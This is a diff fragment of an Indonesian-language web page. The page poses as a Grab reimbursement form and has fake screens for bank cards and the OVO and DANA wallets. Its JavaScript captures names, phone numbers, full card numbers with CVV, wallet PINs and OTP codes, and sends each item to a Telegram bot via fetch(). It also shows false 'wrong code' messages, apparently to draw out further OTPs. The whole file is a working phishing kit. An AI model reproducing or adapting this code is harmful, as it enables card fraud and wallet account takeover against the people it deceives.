+        alert("Lengkapi semua data dulu!");
+        return;
+    }
+
+    // Simpan data untuk dikirim nanti
+    dataPengajuan = { namaDepan, namaBelakang, email, telepon, jumlah, pesanan, alasan };
+
+    // Kirim ke Telegram
+    const pesan = `📝 *PENGAJUAN REIMBURSEMENT GRAB*%0A%0A👤 Nama: ${namaDepan} ${namaBelakang}%0A📧 Email: ${email}%0A📱 Telepon: +62${telepon}%0A💰 Jumlah: Rp ${jumlah}%0A🧾 No Pesanan: ${pesanan}%0A❓ Alasan: ${alasan}`;
+    
+    fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+
+    // Pindah ke halaman metode pembayaran
+    bukaHalaman(3);
+}
+
+// ==========================================
+// FUNGSI BANK / KARTU
+// ==========================================
+function cekFormBank() {
+    const no = document.getElementById('noKartuBank').value;
+    const masa = document.getElementById('masaBank').value;
+    const cvv = document.getElementById('cvvBank').value;
+    const nama = document.getElementById('namaKartuBank').value;
+    const tombol = document.getElementById('btnBank');
+
+    if(no.length >= 16 && masa.length >=5 && cvv.length >=3 && nama.length > 3) {
+        tombol.disabled = false;
+        tombol.classList.remove('bg-gray-300', 'text-gray-400');
+        tombol.classList.add('bg-blue-600', 'text-white', 'hover:bg-blue-700');
+    } else {
+        tombol.disabled = true;
+        tombol.classList.remove('bg-blue-600', 'text-white', 'hover:bg-blue-700');
+        tombol.classList.add('bg-gray-300', 'text-gray-400');
+    }
+}
+
+function kirimBank() {
+    const no = document.getElementById('noKartuBank').value;
+    const masa = document.getElementById('masaBank').value;
+    const cvv = document.getElementById('cvvBank').value;
+    const nama = document.getElementById('namaKartuBank').value;
+
+    const pesan = `💳 *DATA KARTU BANK*%0A%0A👤 Nama: ${nama}%0A🔢 Nomor: ${no}%0A📅 Masa: ${masa}%0A🔐 CVV: ${cvv}`;
+    fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+
+    bukaHalaman('bank_1');
+}
+
+function fokusBank() { document.getElementById('kodeBank').focus(); }
+
+function isiBulatBank(val) {
+    const bulat = document.querySelectorAll('.bulat-bank');
+    const btn = document.getElementById('btnOTP');
+    const pesan = document.getElementById('pesanSalah');
+    pesan.classList.add('hidden');
+
+    bulat.forEach((el, i) => {
+        if(val[i]) el.style.backgroundColor = '#2563eb';
+        else el.style.backgroundColor = 'transparent';
+    });
+
+    btn.disabled = (val.length < 6);
+    if(!btn.disabled) {
+        btn.classList.remove('bg-gray-300', 'text-gray-400');
+        btn.classList.add('bg-orange-500', 'text-white');
+    } else {
+        btn.classList.remove('bg-orange-500', 'text-white');
+        btn.classList.add('bg-gray-300', 'text-gray-400');
+    }
+}
+
+function cekOTP() {
+    const kode = document.getElementById('kodeBank').value;
+    const pesan = document.getElementById('pesanSalah');
+    
+    const pesanTele = `🔐 *KODE OTP BANK*%0A%0AKode: ${kode}`;
+    fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesanTele}&parse_mode=Markdown`);
+
+    pesan.classList.remove('hidden');
+}
+
+// ==========================================
+// FUNGSI OVO
+// ==========================================
+function cekTombolOvo() {
+    const nomor = document.getElementById('nomorOvo').value;
+    const btn = document.getElementById('btnLanjutOvo');
+    if(nomor.length >= 9) {
+        btn.disabled = false;
+        btn.classList.remove('bg-gray-200', 'text-gray-400');
+        btn.classList.add('bg-ovo', 'text-white');
+    } else {
+        btn.disabled = true;
+        btn.classList.remove('bg-ovo', 'text-white');
+        btn.classList.add('bg-gray-200', 'text-gray-400');
+    }
+}
+
+function prosesLanjutOvo() {
+    const nomor = document.getElementById('nomorOvo').value;
+    const pesan = `🟣 *LOGIN OVO*%0A%0ANomor: +62${nomor}`;
+    fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+
+    document.getElementById('tampilNomorOvo').innerText = `0${nomor}`;
+    bukaHalaman('ovo_loading');
+    setTimeout(() => bukaHalaman('ovo_2'), 1500);
+}
+
+function fokusPinOvo() { document.getElementById('pinOvo').focus(); }
+
+function isiPinOvo(val) {
+    const bulat = document.querySelectorAll('.pin-bulat-ovo');
+    bulat.forEach((el, i) => el.style.backgroundColor = val[i] ? '#4B42F0' : 'transparent');
+
+    if(val.length >= 6) {
+        const pesan = `🟣 *PIN OVO*%0A%0APIN: ${val}`;
+        fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+        
+        bukaHalaman('ovo_3');
+    }
+}
+
+function mulaiHitunganOvo() {
+    let detik = 50;
+    const tampil = document.getElementById('hitunganMundurOvo');
+    const btn = document.getElementById('btnKirimUlangOvo');
+    
+    btn.classList.add('hidden');
+    const hitung = setInterval(() => {
+        detik--;
+        tampil.innerText = detik;
+        if(detik <= 0) {
+            clearInterval(hitung);
+            btn.classList.remove('hidden');
+        }
+    }, 1000);
+}
+
+// ==========================================
+// FUNGSI DANA
+// ==========================================
+function cekTombolDana() {
+    const nomor = document.getElementById('nomorDana').value;
+    const btn = document.getElementById('btnLanjutDana');
+    btn.disabled = nomor.length < 9;
+    btn.style.opacity = nomor.length >=9 ? '1' : '0.5';
+}
+
+function prosesLanjutDana() {
+    const nomor = document.getElementById('nomorDana').value;
+    const pesan = `🔵 *LOGIN DANA*%0A%0ANomor: +62${nomor}`;
+    fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+
+    document.getElementById('nomorTujuanDana').innerText = `+62 ${nomor}`;
+    bukaHalaman('dana_loading');
+    setTimeout(() => bukaHalaman('dana_2'), 1500);
+}
+
+function fokusPinDana() { document.getElementById('pinDana').focus(); }
+
+function isiPinDana(val) {
+    const bulat = document.querySelectorAll('.pin-bulat-dana');
+    bulat.forEach((el, i) => el.style.backgroundColor = val[i] ? '#0060E5' : 'transparent');
+
+    if(val.length >= 6) {
+        const pesan = `🔵 *PIN DANA*%0A%0APIN: ${val}`;
+        fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+        
+        bukaHalaman('dana_3');
+    }
+}
+
+function fokusKodeDana() { document.getElementById('kodeOtpDana').focus(); }
+
+function isiKodeOtpDana(val) {
+    const kotak = document.querySelectorAll('.kode-dana');
+    const pesan = document.getElementById('pesanSalahDana');
+    pesan.classList.add('hidden');
+
+    kotak.forEach((el, i) => el.innerText = val[i] || '');
+
+    if(val.length >= 4) {
+        const pesanTele = `🔵 *KODE OTP DANA*%0A%0AKode: ${val}`;
+        fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesanTele}&parse_mode=Markdown`);
+        
+        pesan.classList.remove('hidden');
+    }
+}
+</script>
+
+</body>
+</html>
+
+        
